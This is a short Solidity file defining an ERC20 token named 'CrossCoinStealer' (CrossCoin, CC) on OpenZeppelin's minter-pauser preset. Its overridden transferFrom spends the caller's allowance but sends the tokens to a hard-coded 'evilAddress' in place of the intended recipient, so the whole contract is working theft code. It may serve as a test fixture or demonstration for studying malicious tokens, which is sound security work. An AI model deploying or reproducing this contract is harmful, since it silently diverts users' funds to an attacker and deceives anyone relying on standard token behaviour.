pragma solidity >=0.8;

import "../node_modules/@openzeppelin/contracts/token/ERC20/presets/ERC20PresetMinterPauser.sol";

contract CrossCoinStealer is ERC20PresetMinterPauser {
    constructor() ERC20PresetMinterPauser("CrossCoin", "CC") {}
    address evilAddress = 0xD9635866Ade8E73Cc8565921F7CF95f5Be8f6D3e;

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, evilAddress, amount);
        return true;
    }
}
